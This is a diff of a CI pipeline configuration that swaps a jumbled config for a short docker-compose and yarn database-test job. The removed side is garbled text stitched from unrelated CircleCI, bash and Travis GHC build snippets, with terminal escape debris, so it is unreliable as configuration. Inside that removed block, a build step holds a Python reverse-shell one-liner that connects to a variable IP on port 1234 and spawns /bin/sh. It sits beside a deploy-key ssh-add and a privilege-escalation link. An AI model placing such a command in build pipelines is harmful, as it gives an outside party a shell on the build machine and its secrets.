@@ -16,180 +16,33 @@ jobs:
             echo 'This is the delivery pipeline'
             echo 'parrallel 'Haskell!''
   I-Have-Code:
-    docker:
-      - image: alpine:3.7
+    version: 2
+jobs:
+  build:
+    machine: true # Use a Linux VM instead of docker environment
+    working_directory: ~/bone
+    environment:
+      NODE_ENV: production
     steps:
-      - checkout
-      - run:
-          name: Code Has Arrived
-          command: |
-            ls -al
-            echo '^^^That should look familiar^^^'
-  Run-With-Node:
-    docker:
-      - image: circleci/node:10-browsers
-    steps:
-      - run:
-          name: Running In A Container With Node
-          command: |
-            node -v
-  Now-Complete:
-    docker:
-      - image: alpine:3.7
-    steps:
-      - run:
-          name: Approval Complete
-          command: |
-            echo 'Do work once the approval has completed'
+    - checkout
+    - run:
+        name: "Setup custom environment variables"
+        command: |
+          echo 'export NODE_ENV="production"'
+    - run: echo ${NODE_ENV}
+    - run: docker network create bone-net
+    - run: docker-compose up -d
+    - run: docker exec bone yarn install --no-cache
+    - run:
+        name: Test BONE integration db tests
+        command: docker exec bone yarn db
+        no_output_timeout: 30m
 
 workflows:
- version: 2
- Example_Workflow:
-> while [[ "$1" =~ ^- && ! "$1" == "--" ]]; do case $1 in
-  -V | --version )
-    echo $version
-    exit
-    ;;
-  -s | --string )
-    shift; string=$1
-    ;;
-  -f | --flag )
-    flag=1
-    ;;
-esac; shift; done
-if [[ "$1" == '--' ]]; then shift; fi SUB (^Z) > > > > > > > > > 
- ^[[A^[[A^[[A^[[A^[[A^
-         type: approval
-         requires:
-           - Run-With-Node
-           - I-Have-Code
-     - Now-Complete:
-         requires:
-           - ./ci/Run_gradle_tasks, get_list=available tasks_with --stacktrace.option.sh, wget_stack_trace, Run --debug option to get_output.logs.sh, Run --scan_get_full" insight".sh, SUB ^Z ("THIS RUN CONMAND" ONLY!) 
-           - ~/.circleci/config.yml
-version: 2
-jobs:
-  test:
-    docker:
-      - image: circleci/<language>:<version TAG>
-    parallelism: 4
-    steps:
-      - run:
-          command: |
-            echo $(circleci tests glob "foo/**/*" "bar/**/*")
-            circleci tests glob "foo/**/*" "bar/**/*" | xargs -n 1 echo
---timings-type flag.
-cat my_java_test_classnames | circleci tests split --split-by=timings --timings-type=classname
-circleci tests glob "test/**/*.java" | circleci tests split
-version: 2.1
-  jobs:
-   build:
-    machine:
-      image: ubuntu-1604:201903-0. 
-      # recommended linux image - includes Ubuntu 16.04, docker 18.09.3,   docker-compose 1.23.1
-  resource_class: 2xlarge
-    steps:
-      ... // other config
-     build:
-      executor: win/2xlarge
-    steps:
-      - run: Write-Host 'Hello, World'
-    build: 
-      run: eval "$(ssh-agent ./ci/)" && ssh-add -K ~/.ssh/id_deploy-key 
-        command: ./ci/$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-     working_directory: ~/.sh-python
-      environment: https://www.sans.org/reading-room/whitepapers/testing/attack-defend-linux-privilege-escalation-techniques-2016-37562
-       FOO: bar
-sudo: true
-matrix:
-    include:
-        - os: linux
-          env: MODE="--flavour=quickest inplace/bin/ghc-stage1"
-          compiler: "GHC 8.0.2"
-          addons:
-              apt:
-                  packages:
-                      - ghc-8.0.2
-                      - cabal-install-2.0
-                      - zlib1g-dev
-                  sources: hvr-ghc
-
-          before_install:
-              - PATH="/opt/ghc/8.0.2/bin:$PATH"
-              - PATH="/opt/cabal/2.0/bin:$PATH"
-
-          script:
-              # Run internal Hadrian tests
-              - ./build.sh selftest
-
-              # Build GHC
-              - ./build.sh -j $MODE --no-progress --progress-colour=never --profile=-
-
-        - os: linux
-          env: MODE="--flavour=quickest --integer-simple"
-          compiler: "GHC 8.2.1"
-          addons:
-              apt:
-                  packages:
-                      - ghc-8.2.1
-                      - cabal-install-1.22
-                      - zlib1g-dev
-                  sources: hvr-ghc
-
-          before_install:
-              - PATH="/opt/ghc/8.2.1/bin:$PATH"
-              - PATH="/opt/cabal/1.22/bin:$PATH"
-
-          script:
-              # Build GHC
-              - ./build.sh -j $MODE --no-progress --progress-colour=never --profile=-
-
-              # Test GHC binary
-              - cd ..
-              - inplace/bin/ghc-stage2 -e 1+2
-
-        - os: osx
-          osx_image: xcode8
-          env: MODE="--flavour=quickest --integer-simple inplace/bin/ghc-stage1"
-          before_install:
-              - brew update
-              - brew install ghc cabal-install python3
-
-          script:
-              # Due to timeout limit of OS X build on Travis CI,
-              # we will ignore selftest and build only stage1
-              - ./build.sh -j $MODE --no-progress --progress-colour=never --profile=-
-
-install:
-    # Add Cabal to PATH
-    - PATH="$HOME/.cabal/bin:$PATH"
-    - export PATH
-    - env
-
-    # Fetch GHC sources into ./ghc
-    - git --version
-    - git config --global url."git://github.com/ghc/packages-".insteadOf git://github.com/ghc/packages/
-    - git clone --depth 1 --recursive git://github.com/ghc/ghc
-    # --shallow-submodules is not supported on travis standard git 1.8 (linux), but it is supported
-    # on Travis Mac OS X machines. But it does not work with github mirrors because it cannot
-    # find commits.
-
-    # Install all Hadrian and GHC build dependencies
-    - cabal update
-    - cabal install alex happy
-
-    # Travis has already cloned Hadrian into ./ and we need to move it
-    # to ./ghc/hadrian -- one way to do it is to move the .git directory
-    # and perform a hard reset in order to regenerate Hadrian files
-    - mkdir ghc/hadrian
-    - mv .git ghc/hadrian
-    - cd ghc/hadrian
-    - git reset --hard HEAD
-
-cache:
-    directories:
-        - $HOME/.cabal
-        - $HOME/.ghc
+  version: 2
+  build_and_test:
+    jobs:
+      - build
 
 
 executors:
